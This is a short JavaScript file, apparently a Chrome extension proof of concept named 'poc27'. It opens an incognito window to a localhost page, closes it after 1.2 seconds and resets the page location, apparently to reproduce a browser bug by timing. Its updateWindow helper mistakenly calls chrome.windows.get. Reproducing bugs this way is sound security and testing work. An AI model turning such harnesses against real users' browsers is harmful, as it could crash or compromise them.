
const empty_promise = new Promise((resolve, reject) => {resolve();})

function init() {
	RANDOM = xmur3("seed");
}

// determenistic prng
function xmur3(str) {
    for(var i = 0, h = 1779033703 ^ str.length; i < str.length; i++)
        h = Math.imul(h ^ str.charCodeAt(i), 3432918353),
        h = h << 13 | h >>> 19;
    return function() {
        h = Math.imul(h ^ h >>> 16, 2246822507);
        h = Math.imul(h ^ h >>> 13, 3266489909);
        return (h ^= h >>> 16) >>> 0;
    }
}

// returns a Window
function createWindow(options) {

	let promise = new Promise( (resolve, reject) => {
		chrome.windows.create(options, function(a) {
			resolve(a);
		});
	});

	return promise;	
}

// returns a Window
function updateWindow(windowId, options) {

	let promise = new Promise( (resolve, reject) => {
		chrome.windows.get(windowId, options, function(a) {
			resolve(a);
		});
	});

	return promise;	
}

// returns nothing
function removeWindow(windowId) {

	let promise = new Promise( (resolve, reject) => {
		chrome.windows.remove(windowId, function(a) {
			resolve(a);
		});
	});

	return promise;
}

async function poc27() {
	init();

	setTimeout(function() {
		location = '';
	}, 5000);

	let win1 = await createWindow({url: "https://localhost:8080/child.html", incognito: true});

	console.log(win1);

	setTimeout(function() {
		removeWindow(win1.id);
	}, 1200);
}

poc27();